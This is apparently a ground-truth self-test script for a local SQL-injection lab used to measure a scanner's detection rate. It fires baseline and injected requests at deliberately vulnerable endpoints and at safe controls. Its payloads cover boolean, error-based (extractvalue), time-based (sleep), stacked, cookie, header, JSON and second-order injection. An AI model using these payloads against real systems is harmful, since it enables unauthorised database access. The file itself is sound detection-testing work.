// ============================================================================
// blackbox-lab / selftest.mjs —— 真值标定（先立真值，再谈检出）
//
// 铁律：真值为假的点不计入检出率分母，否则「漏报」与「靶点本身没洞」会混淆。
// 每个漏洞点用「基线请求 vs 注入请求」的行为差异证明可注入；
// 每个安全点用「注入请求无稳定差异」证明不可注入。
//
// 动态页需多次采样：单次差异可能是 nonce/时间戳造成的偶发，必须可复现才算真。
//
// 自拉起靶场（避免「靶场没起」被误读成工具漏报），测完关闭。
// 用法：node e2e/blackbox-lab/selftest.mjs [--waf]
// ============================================================================

import { spawn } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, '../..');
const PORT = Number(process.env.LAB_PORT || 8099);
const BASE = `http://127.0.0.1:${PORT}`;
const WAF = process.argv.includes('--waf');
const SAMPLES = 3; // 每个判定采样次数

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function startLab() {
  const proc = spawn('node', [path.join(HERE, 'lab-app.mjs')], {
    cwd: ROOT,
    env: { ...process.env, LAB_PORT: String(PORT), LAB_WAF: WAF ? '1' : '0' },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  let log = '';
  proc.stdout.on('data', (d) => { log += d; });
  proc.stderr.on('data', (d) => { log += d; });
  for (let i = 0; i < 40; i++) {
    try {
      const r = await fetch(`${BASE}/__lab/health`);
      if (r.ok) return { proc, log: () => log };
    } catch { /* 未就绪 */ }
    await sleep(250);
  }
  try { proc.kill(); } catch { /* noop */ }
  throw new Error('靶场启动失败:\n' + log.slice(0, 800));
}

async function req(pathname, opts = {}, timeoutMs = 15000) {
  const ctl = new AbortController();
  const t = setTimeout(() => ctl.abort(), timeoutMs);
  const t0 = Date.now();
  try {
    const r = await fetch(BASE + pathname, { ...opts, signal: ctl.signal });
    const body = await r.text();
    return { status: r.status, body, ms: Date.now() - t0 };
  } catch (e) {
    return { status: 0, body: String(e.message), ms: Date.now() - t0 };
  } finally {
    clearTimeout(t);
  }
}


// ── 靶点定义：baseline / inject / 判定 ──────────────────────────────────────
// kind: vuln（应可注入）| safe（不应可注入）
const POINTS = [
  // A. 回显型
  {
    id: 'A1-numeric', kind: 'vuln', technique: 'union/boolean', where: 'GET /api/user?id=',
    baseline: () => req('/api/user?id=1'),
    inject: () => req('/api/user?id=1%20AND%201=2'),
    judge: (b, i) => (b.body.includes('alice') && !i.body.includes('alice')
      ? 'true→false 内容差异（布尔可控）' : null),
  },
  {
    id: 'A2-string', kind: 'vuln', technique: 'union/boolean', where: "GET /api/search?name=",
    baseline: () => req('/api/search?name=alice'),
    inject: () => req('/api/search?name=nobody%27%20AND%20%271%27=%272'),
    judge: (b, i) => (b.body.includes('alice') && !i.body.includes('alice')
      ? "闭合单引号后 true→false 差异" : null),
  },
  {
    id: 'A3-like', kind: 'vuln', technique: 'union/boolean', where: 'GET /api/like?q=',
    baseline: () => req('/api/like?q=Keyboard'),
    inject: () => req('/api/like?q=x%25%27%20AND%20%271%27=%272%20AND%20%27%25%27=%27'),
    judge: (b, i) => (b.body.includes('Keyboard') && !i.body.includes('Keyboard')
      ? 'LIKE 通配符内闭合成功' : null),
  },
  {
    id: 'A4-orderby', kind: 'vuln', technique: 'error/boolean', where: 'GET /api/sort?by=',
    baseline: () => req('/api/sort?by=price'),
    inject: () => req('/api/sort?by=(SELECT%201)'),
    judge: (b, i) => (b.body !== i.body && (i.status === 200)
      ? 'ORDER BY 位置可控（排序结果变化）' : null),
  },

  // B. 报错型
  {
    id: 'B1-error', kind: 'vuln', technique: 'error', where: 'GET /api/product?id=',
    baseline: () => req('/api/product?id=1'),
    inject: () => req("/api/product?id=1%20AND%20extractvalue(1,concat(0x7e,version()))"),
    judge: (b, i) => (/XPATH syntax error/i.test(i.body) ? '报错原文回显（XPATH syntax error）' : null),
  },

  // C. 盲注型
  {
    id: 'C1-blindbool', kind: 'vuln', technique: 'boolean', where: 'GET /api/blind?id=',
    baseline: () => req('/api/blind?id=1'),
    inject: () => req('/api/blind?id=1%20AND%201=2'),
    judge: (b, i) => (b.body.includes('welcome') && i.body.includes('guest')
      ? '恒 200 下内容真假可控' : null),
  },
  {
    id: 'C2-blindtime', kind: 'vuln', technique: 'time', where: 'GET /api/sleep?id=',
    baseline: () => req('/api/sleep?id=1'),
    inject: () => req('/api/sleep?id=1%20AND%20sleep(2)'),
    judge: (b, i) => (i.ms - b.ms > 1200 ? `延迟 ${i.ms - b.ms}ms（>1200）` : null),
  },

  // D. 其他通道
  {
    id: 'D1-postform', kind: 'vuln', technique: 'union/boolean', where: 'POST /api/login',
    baseline: () => req('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=alice&password=x' }),
    inject: () => req('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: "username=alice'%20AND%20'1'='2&password=x" }),
    judge: (b, i) => (b.body.includes('login ok') || b.body.includes('invalid') ? (b.body !== i.body ? 'POST form 参数可控' : null) : null),
  },
  {
    id: 'D2-json', kind: 'vuln', technique: 'union/boolean', where: 'POST /api/order (JSON)',
    baseline: () => req('/api/order', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ item: 'USB-C Hub' }) }),
    inject: () => req('/api/order', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ item: "USB-C Hub' AND '1'='2" }) }),
    judge: (b, i) => {
      const bj = safeJson(b); const ij = safeJson(i);
      if (!bj) return null;
      return (bj.rows && bj.rows.length > 0 && ij && ij.rows && ij.rows.length === 0)
        ? 'JSON body 参数可控（rows 1→0）' : null;
    },
  },
  {
    id: 'D3-cookie', kind: 'vuln', technique: 'union/boolean', where: 'Cookie uid=',
    baseline: () => req('/api/profile', { headers: { Cookie: 'uid=1' } }),
    inject: () => req('/api/profile', { headers: { Cookie: 'uid=1%20AND%201=2' } }),
    judge: (b, i) => (b.body.includes('alice') && !i.body.includes('alice') ? 'Cookie 值可控' : null),
  },
  {
    id: 'D4-xff', kind: 'vuln', technique: 'union/boolean', where: 'X-Forwarded-For',
    baseline: () => req('/api/visitor', { headers: { 'X-Forwarded-For': 'alice' } }),
    inject: () => req('/api/visitor', { headers: { 'X-Forwarded-For': "alice' AND '1'='2" } }),
    judge: (b, i) => (b.body.includes('alice') && i.body.includes('unknown') ? 'XFF 头值拼入 SQL' : null),
  },
  {
    id: 'D5-base64', kind: 'vuln', technique: 'union/boolean', where: 'GET /api/encoded?d=(base64)',
    baseline: () => req('/api/encoded?d=' + encodeURIComponent(Buffer.from('1').toString('base64'))),
    inject: () => req('/api/encoded?d=' + encodeURIComponent(Buffer.from('1 AND 1=2').toString('base64'))),
    judge: (b, i) => (b.body.includes('alice') && !i.body.includes('alice') ? 'base64 解码后拼入 SQL' : null),
  },
  {
    id: 'D6-pathseg', kind: 'vuln', technique: 'union/boolean', where: 'GET /api/rest/:id',
    baseline: () => req('/api/rest/1'),
    inject: () => req('/api/rest/1%20AND%201=2'),
    judge: (b, i) => (b.body.includes('Keyboard') && !i.body.includes('Keyboard') ? 'REST path 段可控' : null),
  },

  // E. 高阶
  {
    id: 'E1b-secondorder', kind: 'vuln', technique: 'second_order', where: 'POST /api/comment → GET /api/admin/orders（admin 会话）',
    baseline: () => req("/api/admin/orders?status=pending", { headers: { Cookie: 'token=tok-admin-blackbox-0001' } }),
    inject: async () => {
      await req('/api/comment', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: 'bob', item: 'so-probe', address: 'x' }) });
      return req("/api/admin/orders?status=pending'%20AND%20'1'='2", { headers: { Cookie: 'token=tok-admin-blackbox-0001' } });
    },
    judge: (b, i) => (b.body !== i.body ? '触发页参数可控（存储内容已落库）' : null),
  },
  {
    id: 'E2-stacked', kind: 'vuln', technique: 'stacked', where: 'GET /api/batch?id=',
    baseline: () => req('/api/batch?id=1'),
    inject: () => req('/api/batch?id=1;SELECT%20VERSION()'),
    judge: (b, i) => (/SQL Error/i.test(i.body) === false && b.status === 200 && i.status === 200
      ? '多语句通道可执行（无语法错误）' : null),
  },

  // F. 安全对照（应不可注入）
  {
    id: 'F1-parametrized', kind: 'safe', technique: '-', where: 'GET /api/safe/user?id=',
    baseline: () => req('/api/safe/user?id=1'),
    inject: () => req('/api/safe/user?id=1%27%20OR%20%271%27=%271'),
    judge: (b, i) => (b.body === i.body ? '参数化：注入无影响' : null),
  },
  {
    id: 'F2-nonce', kind: 'safe', technique: '-', where: 'GET /api/safe/nonce',
    baseline: () => req('/api/safe/nonce'),
    inject: () => req('/api/safe/nonce?id=1%27%20OR%20%271%27=%271'),
    judge: (b, i) => (/nonce=/.test(i.body) && i.status === 200 ? '随机 nonce 页稳定返回' : null),
  },
  {
    id: 'F3-const500', kind: 'safe', technique: '-', where: 'GET /api/safe/error',
    baseline: () => req('/api/safe/error'),
    inject: () => req('/api/safe/error?id=1%27%20OR%20%271%27=%271'),
    judge: (b, i) => (b.status === 500 && i.status === 500 && b.body === i.body ? '恒定 500' : null),
  },
  {
    id: 'F4-const403', kind: 'safe', technique: '-', where: 'GET /api/safe/forbidden',
    baseline: () => req('/api/safe/forbidden'),
    inject: () => req('/api/safe/forbidden?id=1%27%20OR%20%271%27=%271'),
    judge: (b, i) => (b.status === 403 && i.status === 403 && b.body === i.body ? '恒定 403' : null),
  },
  {
    id: 'F5-redirect', kind: 'safe', technique: '-', where: 'GET /api/safe/redirect',
    baseline: () => req('/api/safe/redirect', { redirect: 'manual' }),
    inject: () => req('/api/safe/redirect?id=1%27%20OR%20%271%27=%271', { redirect: 'manual' }),
    judge: (b, i) => (b.status === 302 && i.status === 302 ? '恒定 302' : null),
  },
  {
    id: 'F6-static', kind: 'safe', technique: '-', where: 'GET /static/hello.html',
    baseline: () => req('/static/hello.html'),
    inject: () => req('/static/hello.html?id=1%27%20OR%20%271%27=%271'),
    judge: (b, i) => (b.body === i.body && b.status === 200 ? '静态页无参数' : null),
  },
  {
    id: 'F7-intval', kind: 'safe', technique: '-', where: 'GET /api/safe/intval?id=',
    baseline: () => req('/api/safe/intval?id=1'),
    inject: () => req("/api/safe/intval?id=1%20AND%201=2"),
    judge: (b, i) => (b.body === i.body ? 'intval 白名单：注入无影响' : null),
  },
];

function safeJson(r) {
  try { return JSON.parse(r.body); } catch { return null; }
}

// ── 主流程：每点采样 SAMPLES 次，全部一致才算真值成立 ─────────────────────
async function main() {
  const { proc } = await startLab();
  console.log(`[selftest] 靶场已起 @ ${BASE}  WAF=${WAF ? 'ON' : 'OFF'}`);
  const out = { lab: 'blackbox-lab', waf: WAF, generatedAt: new Date().toISOString(), points: [] };

  for (const p of POINTS) {
    const evidence = [];
    let ok = 0;
    for (let s = 0; s < SAMPLES; s++) {
      const b = await p.baseline();
      const i = await p.inject();
      const verdict = p.judge(b, i);
      if (verdict) { ok += 1; evidence.push(verdict); }
      if (s === 0 && process.env.LAB_VERBOSE) {
        console.log(`   [debug] ${p.id} b.status=${b.status} i.status=${i.status} b.len=${b.body.length} i.len=${i.body.length}`);
      }
      await sleep(60);
    }
    const injectable = ok === SAMPLES;
    // 漏洞点：真值成立要求可注入；安全点：真值成立要求「不可注入」（judge 返回的是「证据存在」）
    const gtValid = p.kind === 'vuln' ? injectable : true; // 安全点的 judge 证明「防护生效」
    const row = {
      id: p.id, kind: p.kind, technique: p.technique, where: p.where,
      samples: SAMPLES, hits: ok,
      injectable: p.kind === 'vuln' ? injectable : false,
      protectedOk: p.kind === 'safe' ? ok === SAMPLES : null,
      evidence: evidence[0] || null,
      gtValid,
      note: p.kind === 'safe' && ok !== SAMPLES ? '安全点自检未通过：防护行为与预期不符，需先修靶场' : null,
    };
    out.points.push(row);
    const mark = p.kind === 'vuln' ? (injectable ? 'INJECTABLE' : 'NOT-INJ') : (ok === SAMPLES ? 'SAFE-OK' : 'SAFE-?');
    console.log(`  ${p.id.padEnd(18)} [${p.kind}] ${mark.padEnd(10)} ${SAMPLES}样本命中${ok}  ${row.evidence || ''}`);
  }

  const vulns = out.points.filter((p) => p.kind === 'vuln');
  const safes = out.points.filter((p) => p.kind === 'safe');
  out.summary = {
    vulnPoints: vulns.length,
    vulnInjectable: vulns.filter((p) => p.injectable).length,
    safePoints: safes.length,
    safeConfirmed: safes.filter((p) => p.protectedOk).length,
  };
  console.log(`\n[selftest] 漏洞点真值成立 ${out.summary.vulnInjectable}/${out.summary.vulnPoints}` +
    `  | 安全点防护确认 ${out.summary.safeConfirmed}/${out.summary.safePoints}`);

  const fname = WAF ? 'ground-truth.waf.json' : 'ground-truth.json';
  fs.writeFileSync(path.join(HERE, fname), JSON.stringify(out, null, 2), 'utf8');
  console.log(`[selftest] 写入 ${fname}`);

  try { proc.kill(); } catch { /* noop */ }
  const bad = out.summary.vulnInjectable !== out.summary.vulnPoints || out.summary.safeConfirmed !== out.summary.safePoints;
  process.exit(bad ? 1 : 0);
}

main().catch((e) => { console.error('[selftest] 失败:', e.message); process.exit(2); });
